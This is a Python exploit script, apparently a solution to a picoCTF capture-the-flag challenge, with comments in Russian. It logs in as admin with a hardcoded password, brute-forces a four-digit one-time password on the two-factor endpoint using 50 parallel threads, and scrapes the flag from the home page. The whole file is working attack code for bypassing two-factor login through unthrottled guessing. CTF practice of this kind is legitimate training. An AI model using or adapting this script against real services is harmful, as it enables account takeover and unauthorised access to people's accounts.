import requests
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = 'http://foggy-cliff.picoctf.net:53130'
USERNAME = 'admin'
PASSWORD = 'apple@123'

def exploit():
    # Создаем новую сессию
    session = requests.Session()
    
    # Шаг 1: Логин
    print("[*] Логин с паролем apple@123...")
    login_resp = session.post(
        f'{TARGET}/login',
        data={'username': USERNAME, 'password': PASSWORD},
        allow_redirects=False
    )
    
    if login_resp.status_code != 302:
        print(f"[-] Ошибка логина: {login_resp.status_code}")
        print(login_resp.text)
        return None
    
    print(f"[+] Логин успешен (Статус: {login_resp.status_code})")
    print(f"[+] Куки: {session.cookies.get_dict()}")
    
    # Шаг 2: Брутфорс OTP
    def try_otp(otp):
        otp_str = str(otp).zfill(4)
        try:
            resp = session.post(
                f'{TARGET}/two_fa',
                data={'otp': otp_str},
                allow_redirects=False,
                timeout=2
            )
            if resp.status_code == 302:
                location = resp.headers.get('Location', '')
                if 'home' in location or '/' in location:
                    return otp_str
        except Exception as e:
            pass
        return None
    
    print("[*] Начинаем брутфорс OTP (1000-9999)...")
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(try_otp, otp) for otp in range(1000, 10000)]
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"\n[+] OTP найден: {result} за {time.time() - start:.2f} сек")
                
                # Шаг 3: Получаем содержимое страницы
                print(f"\n[*] Получаем содержимое главной страницы...")
                resp = session.get(f'{TARGET}/')
                
                # Сохраняем полный вывод
                print("\n" + "="*60)
                print("СОДЕРЖИМОЕ СТРАНИЦЫ:")
                print("="*60)
                print(resp.text)
                print("="*60)
                
                # Ищем флаг
                flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
                if flags:
                    print(f"\n🎉 Флаг найден: {flags[0]}")
                    return flags[0]
                else:
                    print("\n[-] Флаг не найден на странице")
                    return None
        else:
            print("[-] OTP не найден за всё время")
            return None

if __name__ == '__main__':
    print("[+] Начинаем атаку...")
    flag = exploit()
    if flag:
        print(f"\n✅ Успех! Флаг: {flag}")
    else:
        print("\n❌ Атака не удалась")
